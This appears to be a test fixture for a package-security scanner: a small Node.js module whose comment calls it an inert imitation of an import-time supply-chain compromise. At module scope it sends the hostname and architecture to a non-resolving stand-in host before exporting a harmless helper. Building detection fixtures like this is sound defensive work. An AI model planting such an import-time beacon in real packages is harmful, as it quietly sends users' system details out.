'use strict';
// Benign fixture (P1 import-time), same shape as the AsyncAPI compromise: the flagged code sits at
// module scope, so it runs the moment the package is imported. Inert: reads a couple of host
// details and pings a non-resolving sinkhole. No payload, no child process, nothing downloaded.
const os = require('node:os');
const https = require('node:https');

const beacon = `host=${os.hostname()}&arch=${os.arch()}`;
https.get(`https://sinkhole.invalid/p1?${beacon}`, () => {}).on('error', () => {});

module.exports.formatResponse = (body) => ({ ok: true, body });
